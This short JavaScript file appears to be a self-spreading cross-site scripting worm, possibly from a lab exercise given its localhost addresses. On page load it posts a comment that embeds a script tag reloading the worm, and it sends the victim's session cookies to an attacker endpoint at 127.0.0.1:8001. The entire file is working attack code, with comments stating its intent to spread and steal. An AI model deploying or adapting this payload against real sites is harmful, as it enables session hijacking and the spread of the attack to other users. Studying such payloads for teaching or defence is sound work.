window.onload = function() {
    // Auto-post infected comment to keep spreading
    fetch('/post', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'content=<script src="http://127.0.0.1:8000/worm.js"></script>'
    });

    // Send victim's session cookies to the attacker's server
    fetch("http://127.0.0.1:8001/steal?cookie=" + document.cookie);
};
